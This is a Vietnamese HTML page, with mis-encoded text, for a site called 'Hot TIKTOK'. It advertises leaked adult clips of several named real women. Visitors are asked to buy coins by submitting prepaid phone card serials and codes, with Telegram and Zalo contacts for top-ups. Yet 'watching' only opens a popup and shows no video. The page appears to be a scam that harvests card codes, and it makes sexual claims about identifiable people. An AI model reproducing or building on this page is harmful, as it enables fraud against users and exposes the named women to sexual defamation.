<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Hot TIKTOK</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #000000, #0000ff, #99ff66, #800080);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: white;
    }

    @keyframes gradientBG {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }

    .navbar {
      background: rgba(0, 0, 0, 0.6);
      padding: 15px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .menu-toggle {
      font-size: 24px;
      cursor: pointer;
    }

    .popup-menu {
      display: none;
      position: absolute;
      top: 60px;
      left: 15px;
      background-color: #111;
      padding: 10px;
      border-radius: 8px;
      z-index: 10;
    }

    .popup-menu a {
      display: block;
      color: #fff;
      margin: 5px 0;
      text-decoration: none;
    }

    .notification-popup {
      background-color: rgba(0, 0, 0, 0.6);
      text-align: center;
      padding: 10px;
      font-size: 16px;
    }

    .user-info {
      text-align: center;
      padding: 20px;
    }

    .topup-form {
      display: none;
      text-align: center;
      background-color: rgba(0, 0, 0, 0.6);
      margin: 10px auto;
      padding: 15px;
      border-radius: 10px;
      width: 90%;
      max-width: 400px;
    }

    input, select, button {
      padding: 10px;
      margin: 8px 0;
      width: 90%;
      max-width: 300px;
      border-radius: 6px;
      border: none;
      font-size: 16px;
    }

    button {
      background-color: #ff5722;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #e64a19;
    }

    .movie-columns {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
      gap: 15px;
      padding: 20px;
    }

    .movie-box {
      background: rgba(0, 0, 0, 0.5);
      padding: 10px;
      border-radius: 8px;
      text-align: center;
      cursor: pointer;
    }

    .movie-box img {
      width: 100%;
      border-radius: 6px;
    }

    .popup, .warn-popup {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      justify-content: center;
      align-items: center;
      z-index: 20;
      background: rgba(0, 0, 0, 0.8);
    }

    .popup-content, .warn-content {
      background: #222;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      color: white;
      width: 90%;
      max-width: 350px;
    }

    .warn-content {
      background: #f44336;
    }
  </style>
</head>
<body>
  <div class="navbar">
    <div class="menu-toggle" onclick="toggleMenu()">‚ò∞</div>
    <a href="/logout" style="color: white; text-decoration: none;">ƒêƒÉng xu·∫•t</a>
  </div>

  <div class="popup-menu" id="popupMenu">
    <a href="#">Trang ch·ªß</a>
    <a href="#">Th√¥ng tin</a>
  </div>

  <div class="notification-popup">
    <strong>Th√¥ng b√°o:</strong> Ch√†o m·ª´ng b·∫°n ƒë·∫øn v·ªõi Hot TIKTOK! ƒê√¢y l√† n∆°i b·∫°n c√≥ th·ªÉ xem c√°c video hot tr√™n TikTok v√≠ d·ª•( idol l·ªô clipüîû, chi ti·∫øt drama v√† video n·∫øu c√≥,...) CSKH Telegram: @mun2k11 
   Tik Tok: @hot.tiktok031

  (video m·ªõi s·∫Ω ƒë∆∞·ª£c c·∫≠p nh·∫≠t li√™n t·ª•c n√™n vi·ªác web x·∫£y ra l·ªói l√† ƒë·ªÅu ch·∫Øc ch·∫Øn x·∫£y, v√¨ ƒë√¢y l√† web s·∫°ch kh√¥ng ng·∫°i r·ªßi ro n√™n th√¥ng c·∫£m cho admin nh√© !!! )ü§óü§óü§ó
  </div>

  <div class="user-info">
    <h2>Xin ch√†o <span id="userName"></span></h2>
    <p>B·∫°n c√≥ <span id="userCoins"></span> xu</p>
    <button onclick="toggleTopup()" id="topupToggle">N·∫°p xu</button>
  </div>

  <div id="topupForm" class="topup-form"></div>

  <div class="movie-columns">
    <div class="movie-box" onclick="watchMovie()">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQNMU57mqG8MtoHtzAMhMjzZ-tJ5lvn7VNIUw&s" alt="IDOL MUN">
      <p>IDOL MUNüîû</p>
    </div>
    <div class="movie-box" onclick="watchMovie()">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS-nXK3vbQUnEmUE_rg9aJygipqQHVqwHsY6w&s" alt="TR·∫¶N H√Ä LINH">
      <p>TR·∫¶N H√Ä LINH üîû</p>
    </div>
    <div class="movie-box" onclick="watchMovie()">
      <img src="https://images.kienthuc.net.vn/zoomh/800/uploaded/phuongdh/2025_01_08/3/dan-hot-girl-tiep-tuc-khuay-dong-trend-vay-bang-keo-cuc-nong-bong-Hinh-3.jpg" alt="LA HO√ÄNG K·ª≤ DUY√äN">
      <p>LA HO√ÄNG K·ª≤ DUY√äNüîû</p>
    </div>
  </div>

  <!-- Xem phim popup -->
  <div class="popup" id="moviePopup">
    <div class="popup-content">
      <h3>Xem ch·ªó k√≠n ƒë√°o nh√© broüòú</h3>
      <p>Th∆∞·ªüng th·ª©c video b·∫°n ƒë√£ ch·ªçn!</p>
      <button onclick="closePopup()">ƒê√≥ng</button>
    </div>
  </div>

  <!-- C·∫£nh b√°o kh√¥ng ƒë·ªß xu -->
  <div class="popup warn-popup" id="warnPopup">
    <div class="warn-content">
      <strong>Kh√¥ng ƒë·ªß xu!</strong>
      <p>B·∫°n kh√¥ng ƒë·ªß xu trong t√†i kho·∫£n r·ªìi. kh√¥ng sao b·∫°n li√™n h·ªá admin tele @mun2k11 ho·∫∑c zalo 0366319252 ƒë·ªÉ n·∫°p xu, n·∫°p th√™m ƒë·∫°n nh√© !!!.</p>
      <button onclick="closeWarn()">ƒê√≥ng</button>
    </div>
  </div>

  <script>
    let userCoinsGlobal = 0;

    function toggleMenu() {
      const menu = document.getElementById("popupMenu");
      menu.style.display = menu.style.display === "block" ? "none" : "block";
    }

    function toggleTopup() {
      const form = document.getElementById("topupForm");
      form.style.display = form.style.display === "block" ? "none" : "block";
    }

    function watchMovie() {
      if (userCoinsGlobal >= 5) {
        fetch('/api/watch', { method: 'POST' })
          .then(res => res.json())
          .then(data => {
            if (data.success) {
              userCoinsGlobal -= 5;
              document.getElementById("userCoins").textContent = userCoinsGlobal;
              document.getElementById("moviePopup").style.display = "flex";
            }
          });
      } else {
        document.getElementById("warnPopup").style.display = "flex";
      }
    }

    function closePopup() {
      document.getElementById("moviePopup").style.display = "none";
    }

    function closeWarn() {
      document.getElementById("warnPopup").style.display = "none";
    }

    fetch('/api/me')
      .then(res => res.json())
      .then(user => {
        document.getElementById("userName").textContent = user.email;
        document.getElementById("userCoins").textContent = user.coins;
        userCoinsGlobal = user.coins;

        const form = document.getElementById("topupForm");
        const toggleBtn = document.getElementById("topupToggle");

        if (user.email === "admin") {
          toggleBtn.textContent = "C·ªông xu";
          form.innerHTML = `
            <h3>C·ªông xu</h3>
            <form action="/admin/add-coins" method="POST">
              <input type="text" name="targetEmail" placeholder="Email ng∆∞·ªùi nh·∫≠n" required>
              <input type="number" name="amount" placeholder="S·ªë xu" required>
              <button type="submit">C·ªông xu</button>
            </form>
          `;
        } else {
          toggleBtn.textContent = "N·∫°p xu";
          form.innerHTML = `
            <h3>N·∫°p xu</h3>
            <form action="/submit-card" method="POST">
              <input type="hidden" name="email" value="${user.email}">
              <select name="cardType" required>
                <option value="">Ch·ªçn lo·∫°i th·∫ª</option>
                <option value="Viettel">Viettel</option>
                <option value="Mobifone">Mobifone</option>
                <option value="Vinaphone">Vinaphone</option>
              </select>
              <input type="text" name="serial" placeholder="Serial" required>
              <input type="text" name="code" placeholder="M√£ th·∫ª" required>
              <input type="number" name="amount" placeholder="M·ªánh gi√°" required>
              <button type="submit">N·∫°p th·∫ª</button>
            </form>
          `;
        }
      });
  </script>
</body>
</html>